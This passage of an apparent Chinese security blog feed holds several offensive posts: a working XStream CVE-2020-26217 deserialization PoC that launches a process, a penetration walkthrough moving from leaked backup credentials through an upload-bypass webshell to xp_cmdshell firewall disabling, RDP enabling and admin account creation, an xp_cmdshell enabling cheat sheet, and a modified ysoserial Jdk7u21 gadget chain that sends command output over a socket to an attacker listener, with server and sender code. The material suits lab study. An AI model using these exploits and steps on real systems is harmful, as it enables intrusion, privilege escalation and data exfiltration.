class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;<br>                &lt;buf&gt;&lt;/buf&gt;<br>                &lt;pos&gt;0&lt;/pos&gt;<br>                &lt;mark&gt;0&lt;/mark&gt;<br>                &lt;count&gt;0&lt;/count&gt;<br>              &lt;/in&gt;<br>            &lt;/is&gt;<br>            &lt;consumed&gt;false&lt;/consumed&gt;<br>          &lt;/dataSource&gt;<br>          &lt;transferFlavors/&gt;<br>        &lt;/dataHandler&gt;<br>        &lt;dataLen&gt;0&lt;/dataLen&gt;<br>      &lt;/value&gt;<br>    &lt;/jdk.nashorn.internal.objects.NativeString&gt;<br>    &lt;string&gt;test&lt;/string&gt;<br>  &lt;/entry&gt;<br>&lt;/map&gt;<br></code></pre></div></td></tr></table></figure><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>创建一个maven项目，引入组件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;dependency&gt;<br>    &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;<br>    &lt;artifactId&gt;xstream&lt;/artifactId&gt;<br>    &lt;version&gt;1.4.13&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure><p>新建一个利用类，插入POC</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CVE_2020_26217</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException</span>&#123;<br>        XStream xStream = <span class="hljs-keyword">new</span> XStream();<br>        String payload = <span class="hljs-string">&quot;&lt;map&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &lt;value class=&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;contentType&gt;text/plain&lt;/contentType&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;is class=&#x27;java.io.SequenceInputStream&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &lt;e class=&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;iterator class=&#x27;javax.imageio.spi.FilterIterator&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                  &lt;iter class=&#x27;java.util.ArrayList$Itr&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;cursor&gt;0&lt;/cursor&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;lastRet&gt;-1&lt;/lastRet&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;outer-class&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                      &lt;java.lang.ProcessBuilder&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                        &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                          &lt;string&gt;calc&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                        &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                      &lt;/java.lang.ProcessBuilder&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;/outer-class&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                  &lt;/iter&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                  &lt;filter class=&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;method&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                      &lt;name&gt;start&lt;/name&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;/method&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;name&gt;start&lt;/name&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                  &lt;/filter&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                  &lt;next/&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/iterator&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;type&gt;KEYS&lt;/type&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &lt;/e&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &lt;in class=&#x27;java.io.ByteArrayInputStream&#x27;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;buf&gt;&lt;/buf&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;pos&gt;0&lt;/pos&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;mark&gt;0&lt;/mark&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;count&gt;0&lt;/count&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &lt;/in&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/is&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;      &lt;/value&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;string&gt;test&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/map&gt;&quot;</span>;<br>        xStream.fromXML(payload);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/images/34/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
      <tag>XStream RCE</tag>
      
      <tag>CVE-2020-26217</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安服漏洞测试流程(附从常规实战拿shell到提权)</title>
    <link href="/2020/11/02/7/"/>
    <url>/2020/11/02/7/</url>
    
    <content type="html"><![CDATA[<h1 id="分两种情况"><a href="#分两种情况" class="headerlink" title="分两种情况"></a>分两种情况</h1><h2 id="一、资产是ip的时候"><a href="#一、资产是ip的时候" class="headerlink" title="一、资产是ip的时候"></a>一、资产是ip的时候</h2><p><img src="/images/7/1.png"></p><h3 id="1、首先信息收集"><a href="#1、首先信息收集" class="headerlink" title="1、首先信息收集"></a>1、首先信息收集</h3><p>先扫描ip段，探测存活、端口开放情况<br>此处为了更直观的教学，这里用railgun工具做例子（实战时没有这个工具可以用nmap）<br><img src="/images/7/2.png"><br>看看开了什么端口，可以根据扫描结果获得指纹信息（中间件类型/CMS类型）<br><img src="/images/7/3.png"><br>看到有什么远程连接或者数据库的端口比如3389、21、22、1433、3306的可以尝试弱口令/爆破</p><h3 id="2、漏洞测试"><a href="#2、漏洞测试" class="headerlink" title="2、漏洞测试"></a>2、漏洞测试</h3><p>根据扫描结果得到一个正在运行的web服务<br><img src="/images/7/4.png"><br>首先进行目录扫描，查看有无敏感信息，比如备份文件、数据库文件等信息，也可以通过目录扫描得到的结果尝试直接访问看看是否存在越权/未授权访问<br>目录扫描后打开该站点查看有哪些功能可以测试<br><img src="/images/7/5.png"><br><strong>URL：</strong>是否存在ref=、target=、forward=、redirect=、services=等转发参数，可以尝试URL任意重定向；如果存在其他参数则可以根据参数尝试XSS、SQL注入、SSRF、文件包含（内容读取）等,根据框架可以尝试自己fuzz一些接口，比如spring的swagger等<br><strong>登陆框：</strong>弱口令、爆破、SQL注入<br>先尝试弱口令登陆，看是否存在测试账号、管理员账号弱密码；<br>根据尝试登陆返回的状态比如“用户不存在”以及验证码状态（验证码不变）来判断是否可以进行爆破；可以尝试如admin’ or’=’or’#来尝试万能密码登陆或者抓包进行SQL注入检测<br><strong>账号注册：</strong>在注册的时候可以尝试用跟管理员一样的账号注册来覆盖他的密码；还可以尝试短信轰炸/邮件轰炸、SQL注入等漏洞<br><strong>忘记密码：</strong>可以尝试任意密码重置、SQL注入、短信轰炸/邮件轰炸<br><strong>F12查看网页源代码：</strong>看页面源码是否存在敏感信息，比如账号密码、验证码接口、其他隐藏接口等<br><strong>其他功能：</strong>测试流程如上<br><strong>数据包：</strong><br><img src="/images/7/6.png"><br>可以测试的点有：CORS（修改Origin）、不安全的HTTP请求方法（PUT/DELETE等）<br><img src="/images/7/7.png"><br>此外可以尝试HOST头攻击（修改host值为恶意值）、SQL注入（POST）、明文传输、反序列化等</p><h2 id="二、资产是url且有账号的时候"><a href="#二、资产是url且有账号的时候" class="headerlink" title="二、资产是url且有账号的时候"></a>二、资产是url且有账号的时候</h2><p><img src="/images/7/8.png"><br>判断指纹，网上搜该cms的漏洞进行验证<br>按照上述流程测试，这里以注册账号后测试为例<br>测试可以测试的所有功能，流程跟一同<br><img src="/images/7/9.png"><br><strong>Xss</strong><br>有框就插<br><img src="/images/7/10.png"><br><img src="/images/7/11.png"><br><strong>文件读取，看参数请求</strong><br><img src="/images/7/12.png"><br><img src="/images/7/13.png"><br>或者从旁站入手<br>涉及到的知识：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Nmap使用<br>目录扫描<br>条件竞争<br>HOST头攻击<br>端口服务<br>敏感高危端口<br>登陆爆破<br>万能账号密码<br>WEB指纹<br>XSS<br>SQL注入<br>URL任意重定向<br>任意文件读取<br>任意密码重置<br>敏感信息泄露<br>不安全的HTTP方法<br>跨域资源访问（CORS）<br>跨域请求伪造（CORF）<br>服务器端请求伪造（SSRF）<br>Weblogic命令执行<br>Redis未授权访问<br>Struts2命令执行<br>Shiro反序列化<br>Seeyon任意文件写入<br>Tomcat默认页面<br>Weblogic默认页面<br>Nginx默认页面内网ip泄露<br>中间件版本信息泄露<br>任意文件上传<br>越权<br>...<br></code></pre></div></td></tr></table></figure><p>测试时要关注数据参数，参数可控还会造成的各类衍生结合利用</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>得到一个ip 192.168..6.131</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/7/14.png"><br>得到端口为27689的web服务<br><img src="/images/7/15.png"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p><img src="/images/7/16.png"><br>得到备份文件web.config.bak<br><img src="/images/7/17.png"><br>在备份文件里得到数据库的账号密码，直接连接<br><img src="/images/7/18.png"><br><img src="/images/7/19.png"><br>利用目录扫描得到的后台登陆账号密码进入后台<br><img src="/images/7/20.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此处上传只允许上传图片，利用一点上传绕过知识进行拿webshell<br><img src="/images/7/21.png"><br>如果返回包不返回文件路径，可以通过报错来回显路径来登陆webshell<br><img src="/images/7/22.png"><br><img src="/images/7/23.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到webshell后通过cmd功能得知当前权限为www<br><img src="/images/7/24.png"><br>直接添加账号提示拒绝访问<br><img src="/images/7/15.png"><br>上传nc，进程已经启动，但是连接不了，判断开了防火墙<br>无果，另寻他法<br>翻看网站根目录还有一个备份文件，得到sa账号密码（在渗透到时候信息收集不能断，总会有意想不到的惊喜）<br><img src="/images/7/26.png"><br>连接<br><img src="/images/7/27.png"><br>利用system权限关掉防火墙<br><img src="/images/7/28.png"><br>结合sql语句构造</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">EXEC master.dbo.xp_cmdshell ‘netsh firewall <span class="hljs-built_in">set</span> opmode mode=<span class="hljs-built_in">disable</span>’<br></code></pre></div></td></tr></table></figure><p><img src="/images/7/29.png"><br>再次尝试nc<br><img src="/images/7/30.png"><br>开启3389<br><img src="/images/7/31.png"><br>结合xp_cmdshell构造</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">EXEC xp_cmdshell ‘REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f’<br></code></pre></div></td></tr></table></figure><p><img src="/images/7/32.png"><br>添加账号<br><img src="/images/7/33.png"><br><img src="/images/7/34.png"><br>远程连接<br><img src="/images/7/35.png"><br>添加到管理员组<br><img src="/images/7/36.png"><br>再次连接<br><img src="/images/7/37.png"><br>假如登陆sa之后发现未启用cmdshell，就手动启动一下<br>启用高级选项：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,1<br></code></pre></div></td></tr></table></figure><p>0是关闭，1是开启，这时候会提示<code>RECONFIGURE</code>，那就按照提示运行一下<code>RECONFIGURE</code><br>启用cmdshell：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,1<br></code></pre></div></td></tr></table></figure><p>再次提示<code>RECONFIGURE</code>，再运行一下<br>这个时候就可以用cmdshell了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安服</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手工提权-mssql启用cmdshell</title>
    <link href="/2020/10/28/32/"/>
    <url>/2020/10/28/32/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,1  //启用高级选项，0为关闭<br>RECONFIGURE  //根据回显提示重新启动一下<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>,1  //启用cmdshell，0为关闭<br>RECONFIGURE //根据回显提示重新启动一下<br><span class="hljs-built_in">exec</span> xp_cmdshell <span class="hljs-string">&#x27;cmd命令&#x27;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化-在利用链里利用socket进行shell回显</title>
    <link href="/2020/10/20/33/"/>
    <url>/2020/10/20/33/</url>
    
    <content type="html"><![CDATA[<p>以Jdk7u21为例<br>首先看jdk7u21类的getObject方法<br><img src="/images/33/1.png"><br>在getObject方法里定义了一个<code>command</code>，这个<code>command</code>就是poc里的恶意对象，此处用Gadgets类的<code>createTemplatesImpl</code>方法处理获取到的command，跟进<code>createTemplatesImpl</code><br><img src="/images/33/2.png"><br>处理返回<code>createTemplatesImpl</code>，跟进<br><img src="/images/33/3.png"><br>此处就是获取恶意对象进行具体处理的地方，我们把原来的string cmd注释掉，重新写一个socket的客户端，利用发送到目标触发反序列化漏洞来进行socket连接</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java.net.Socket socket=<span class="hljs-keyword">new</span> java.net.Socket(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">9999</span>);<br>java.io.OutputStream outputStream = socket.getOutputStream();<br>Process whoami = Runtime.getRuntime().exec(<span class="hljs-string">&quot;+command+&quot;</span>);  <span class="hljs-comment">//直接写死命令也行</span><br>java.io.InputStream inputStream = whoami.getInputStream();<br><span class="hljs-keyword">int</span> len;<br><span class="hljs-keyword">byte</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>java.io.ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br><span class="hljs-keyword">while</span>((len=inputStream.read(buf))!=-<span class="hljs-number">1</span>)&#123;<br>    baos.write(buf,<span class="hljs-number">0</span>,len);<br>&#125;<br>inputStream.close();<br><span class="hljs-keyword">byte</span>[] bytes = baos.toByteArray();<br>outputStream.write(bytes);<br>outputStream.flush();<br>outputStream.close();<br></code></pre></div></td></tr></table></figure><p>再新建一个socket服务端serverexp.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><br><span class="hljs-keyword">import</span> com.sun.security.ntlm.Server;<br><br><br><span class="hljs-keyword">import</span> java.net.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">serverexp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Thread</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> ServerSocket serverSocket;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">serverexp</span><span class="hljs-params">(<span class="hljs-keyword">int</span> port)</span> <span class="hljs-keyword">throws</span> IOException</span><br><span class="hljs-function">    </span>&#123;<br>        serverSocket = <span class="hljs-keyword">new</span> ServerSocket(port);<br>        serverSocket.setSoTimeout(<span class="hljs-number">10000</span>);<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)<br>        &#123;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                System.out.println(<span class="hljs-string">&quot;等待远程连接，端口号为：&quot;</span> + serverSocket.getLocalPort() + <span class="hljs-string">&quot;...&quot;</span>);<br>                Socket server = serverSocket.accept();<br>                System.out.println(<span class="hljs-string">&quot;远程主机地址：&quot;</span> + server.getRemoteSocketAddress());<br>                <span class="hljs-comment">//DataInputStream in = new DataInputStream(server.getInputStream());</span><br>                InputStream inputStream = server.getInputStream();<br>                <span class="hljs-comment">// System.out.println(in.readUTF());</span><br>                <span class="hljs-keyword">int</span> len;<br>                <span class="hljs-keyword">byte</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                java.io.ByteArrayOutputStream baos=<span class="hljs-keyword">new</span> java.io.ByteArrayOutputStream();<br>                <span class="hljs-keyword">while</span>((len=inputStream.read(buf))!=-<span class="hljs-number">1</span>)&#123;<br>                    baos.write(buf,<span class="hljs-number">0</span>,len);<br>                &#125;<br>                <span class="hljs-keyword">byte</span>[] bytes = baos.toByteArray();<br>                System.out.println(<span class="hljs-keyword">new</span> String(bytes));<br>                DataOutputStream out = <span class="hljs-keyword">new</span> DataOutputStream(server.getOutputStream());<br>                out.flush();<br>                <span class="hljs-comment">//out.writeUTF(&quot;谢谢连接我：&quot; + server.getLocalSocketAddress() + &quot;\nGoodbye!&quot;);</span><br>                server.close();<br>            &#125;<span class="hljs-keyword">catch</span>(SocketTimeoutException s)<br>            &#123;<br>                System.out.println(<span class="hljs-string">&quot;Socket timed out!&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<span class="hljs-keyword">catch</span>(IOException e)<br>            &#123;<br>                e.printStackTrace();<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String [] args)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">9999</span>;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            Thread t = <span class="hljs-keyword">new</span> serverexp(port);<br>            t.run();<br>        &#125;<span class="hljs-keyword">catch</span>(IOException e)<br>        &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>目标机起一个含有反序列化漏洞的服务，<br>写一个正常的POC</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial;<br><br><span class="hljs-keyword">import</span> ysoserial.payloads.Jdk7u21;<br><br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exptest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Jdk7u21 payloadtest = <span class="hljs-keyword">new</span> Jdk7u21();  <span class="hljs-comment">//调用jdk利用链</span><br>        Object vultest = payloadtest.getObject(<span class="hljs-string">&quot;ipconfig&quot;</span>);  <span class="hljs-comment">//恶意对象</span><br>        Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;192.168.83.166&quot;</span>,port);  <span class="hljs-comment">//建立连接</span><br>        ObjectOutputStream oss = <span class="hljs-keyword">new</span> ObjectOutputStream(socket.getOutputStream());  <span class="hljs-comment">//获取输出流</span><br>        oss.writeObject(vultest);  <span class="hljs-comment">//触发恶意对象</span><br>        <span class="hljs-comment">//System.out.print(vultest);</span><br>        oss.flush();<br>        oss.close();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>然后攻击机运行POC即可看到回显<br><img src="/images/33/4.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
      <tag>shell回显</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0day预告-我的第一个java组件反序列化漏洞</title>
    <link href="/2020/10/12/17/"/>
    <url>/2020/10/12/17/</url>
    
    <content type="html"><![CDATA[<p>某上市公司产品<br><img src="/images/17/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA代码审计</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring boot Thymeleaf模板注入 payload</title>
    <link href="/2020/10/10/31/"/>
    <url>/2020/10/10/31/</url>
    
